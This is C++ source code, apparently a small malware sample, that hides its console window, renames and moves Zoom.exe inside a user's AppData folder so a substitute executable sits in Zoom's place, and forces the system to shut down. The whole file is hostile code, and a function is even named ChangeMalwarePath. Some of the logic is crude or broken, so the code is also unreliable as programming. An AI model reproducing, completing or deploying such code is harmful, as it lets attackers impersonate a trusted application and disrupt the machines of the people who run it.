//Made by TheMentor//

#include <iostream>
#include <Windows.h>

using namespace std;

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ExecuteShutDown(){
	system(R"(shutdown -f)");
}

void ChangeMalwarePath(){
	system(R"(move Zoom.exe C:\Users\w0lf\AppData\Roaming\Zoom\bin)");
	
	ExecuteShutDown();
	
	system(R"(C:\Users\w0lf\AppData\Roaming\Zoom\bin\Zoom2.exe)");
}

int RenameZoomEXE(){	
	
	int val = system(R"(C:\Users\w0lf\AppData\Roaming\Zoom\bin\Zoom2.exe)");
	if(val == 1){
		system(R"(rename C:\Users\w0lf\AppData\Roaming\Zoom\bin\Zoom.exe Zoom2.exe)");
		ChangeMalwarePath();
	}else{
		ExecuteShutDown();
	}
}

int main(){
	HideConsole();
	RenameZoomEXE();
	//ChangeMalwarePath();
}
